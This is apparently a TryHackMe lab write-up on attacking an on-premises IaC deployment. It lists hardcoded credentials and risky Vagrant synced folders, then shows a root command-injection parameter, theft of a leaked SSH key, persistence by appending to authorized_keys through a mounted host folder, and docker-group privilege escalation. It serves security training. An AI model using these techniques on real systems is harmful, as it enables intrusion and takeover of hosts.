
# On-Premises IaC

![](images/on-premises-iac/thm_room_banner.png)


## The Environment

After SSHing into the entry host as `entry:entry`, I transferred the IaC files to my AttackBox (TryHackMe's Ubuntu-based VM) using SCP for easier analysis:


```bash
scp -r entry@10.113.171.225:/home/entry/iac /root/iac_task
```

```
.
└── iac/
    ├── provision/
    │   ├── roles/
    │   │   └── webapp/
    │   │       ├── defaults/
    │   │       │   └── main.yml
    │   │       ├── tasks/
    │   │       │   ├── app-setup.yml
    │   │       │   ├── db-setup.yml
    │   │       │   └── main.yaml
    │   │       ├── templates/
    │   │       │   ├── app/
    │   │       │   │   ├── static/
    │   │       │   │   │   ├── bootstrap.min.css
    │   │       │   │   │   ├── signup.css
    │   │       │   │   │   ├── style.css
    │   │       │   │   │   └── tryhackme-logo.svg
    │   │       │   │   └── templates/
    │   │       │   │       ├── error.html
    │   │       │   │       ├── index.html
    │   │       │   │       ├── signin.html
    │   │       │   │       ├── signup.html
    │   │       │   │       └── userhome.html
    │   │       │   ├── app.py
    │   │       │   ├── createdb.sql
    │   │       │   └── createsp.sql
    │   │       └── vars/
    │   │           └── new_keys/
    │   │               └── id_rsa.pub
    │   ├── variables/
    │   │   └── web.yml
    │   └── web-playbook.yml
    └── Vagrantfile
```



## Static Analysis

I started with analysing config files - this is where most of the treasure was buried.

### Hardcoded credentials everywhere

`provision/variables/web.yml`:

```yaml
ui_admin_pass: Str0ngAdminP@ssw3rd
ui_manager_pass: Str0ngManagerP@ssw3rd
rootPassword: $1$4dsf57$A32VKCZf5rGmgxzjTo6DB0    # "iloveyou1"
vagrantPassword: $1$edsr5y$.aCg6VGPf2HHQ9Hl17ies. # "stealingMoneyFromBanks"
```


`provision/roles/webapp/defaults/main.yml`:

```yaml
db_password: mysecretpasswd
api_key: superapikey
```

### Dangerous synced folders

The `Vagrantfile` contains this gem:

```ruby
cfg.vm.synced_folder "/home/ubuntu/", "/tmp/datacopy"
cfg.vm.synced_folder "./provision", "/tmp/provision"
```

The entire `/home/ubuntu/` directory on the host is mounted live into the webserver container. The comment in the file literally says _"Will remove later to harden"_. It was not removed. 

### Leftover deployment artifacts

`tasks/app-setup.yml` copies a private key into the container's root SSH directory:


```yaml
shell: cp /tmp/provision/roles/webapp/vars/new_keys/id_rsa /root/.ssh/
```

The SQL cleanup task was also commented out:


```yaml
#- name: Cleanup Scripts
#  shell: rm -r /tmp/sql
```


---

## Nmap Scan

```bash
$ nmap -p- 172.20.128.0/24
Starting Nmap 7.80 ( https://nmap.org ) at 2026-06-14 15:40 UTC
Nmap scan report for ip-172-20-128-1.eu-central-1.compute.internal (172.20.128.1)
Host is up (0.00026s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap scan report for ip-172-20-128-2.eu-central-1.compute.internal (172.20.128.2)
Host is up (0.00031s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap scan report for ip-172-20-128-3.eu-central-1.compute.internal (172.20.128.3)
Host is up (0.00034s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
3306/tcp open  mysql
```

Having SSH open on the database container was a nice surprise!

---


## Web app exploit - flag 1

Web app runs on `172.20.128.2:80`, a Docker network not directly accessible from my machine. I created a tunnel to connect to a web app via my browser, by using -L flag to specify local port forward (I used 8080), destination host (docker container hosting flask app on port 80). Flags -N and -f were used to specify that I only want tunnel to the machine and not execute any shell command, as well as to run tunnel in the background. 

```
ssh -L 8080:172.20.128.2:80 -N -f entry@10.113.171.225
```


With the tunnel running, `http://localhost:8080` showed a "Bucket List App" with suspiciously big "Test DB" button on the login page. 



![](images/on-premises-iac/bucket_list_homepage.png)

![](images/on-premises-iac/login_page_test_db_button.png)


When I clicked `(Dev) Test DB` I saw in the network tab a POST request with a `_command` parameter set to `service mysql status`, and the page rendered back "MySQL Community Server 5.7.42 is running." That's the literal output of that shell command.

![](images/on-premises-iac/testdb_response_headers.png)

![](images/on-premises-iac/testdb_request_command_param.png)

![](images/on-premises-iac/testdb_response_rendered.png)

That's unauthenticated OS command execution. I sent this to Burp Repeater and swapped the command for `whoami`.

![](images/on-premises-iac/burp_repeater_whoami_root.png)

From here I could run arbitrary commands as root inside the webserver container.
I've searched for the name of the first flag to discover its location. 

![](images/on-premises-iac/flag1_location_found.png)

And finally the first flag itself. 

![](images/on-premises-iac/flag1_captured.png)



Time to verify at runtime what the static analysis predicted: I checked whether the key from `app-setup.yml` actually made it onto the live container.

![](images/on-premises-iac/root_ssh_dir_listing.png)

Confirmed: `/root/.ssh/id_rsa` was sitting there exactly as the Ansible task described.

![](images/on-premises-iac/root_id_rsa_dumped.png)



## Leaked Root SSH Key via Vagrant's Default Sync Folder - flag 2

The hint for the next flag was: 

```
When a Vagrant deployment is performed, by default, Vagrant will create a local copy of the provisioning directory under the /vagrant/ folder. Have a look that and see if some sensitive information may have been left there.
```

Don't have to tell me twice!


![](images/on-premises-iac/vagrant_dir_listing.png)

`_command=ls -la /vagrant/keys/`

```
drwxr-xr-x 2 1000 1000 4096 Jan 23  2024 .
drwxr-xr-x 5 1000 1000 4096 Jan 23  2024 ..
-rw------- 1 1000 1000 2602 Jan 23  2024 id_rsa
-rw-r--r-- 1 1000 1000  570 Jan 23  2024 id_rsa.pub
```


![](images/on-premises-iac/vagrant_key_dumped.png)

I copied the private key and had a little derailing when trying to use it for a connection. 

```
ssh -i id_rsa -v root@172.20.128.2
(...)
debug1: identity file id_rsa type -1
```

After some debugging - the key had Windows-style line endings from copy pasting, fixed by:
```
cat id_rsa | tr -d '\r' > id_rsa_fixed
```

```bash
ssh -i id_rsa_fixed root@172.20.128.2
```

The second flag was waiting in root's home directory. 

![](images/on-premises-iac/flag2_captured.png)

## Pivoting to the Host via Synced Folder - flag 3

Now inside the webserver container as root, I checked the mounted shares from the Vagrantfile:

```ruby
cfg.vm.synced_folder "./provision", "/tmp/provision"
cfg.vm.synced_folder "/home/ubuntu/", "/tmp/datacopy"
```

```bash
ls -la /tmp/datacopy/
```

This directory is a live, bidirectional mount of `/home/ubuntu/` on the host machine. Which means I could write to it.

I generated a fresh SSH keypair on the entry host:

```bash
ssh-keygen -t rsa -f /home/entry/iac/keys/container_key -N ""
```

Then from inside the container, appended the new public key to ubuntu's `authorized_keys` on the host:

```bash
echo "ssh-rsa AAAA...entry@tryhackme" >> /tmp/datacopy/.ssh/authorized_keys
```

Back on the entry host:

```bash
ssh -i container_key ubuntu@172.20.128.1
```

Flag 3 was in ubuntu's home directory.


![](images/on-premises-iac/flag3_captured.png)


## Docker Group Privilege Escalation - flag 4

Once on the host as `ubuntu`, I checked the user's privileges:

```bash
ubuntu@tryhackme:~$ id
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),118(lxd),998(docker)
```

Ubuntu is in the `docker` group. This is essentially equivalent to root access - anyone who can run `docker` can mount the host filesystem into a container and chroot into it:

![](images/on-premises-iac/docker_group_escape_flag4.png)
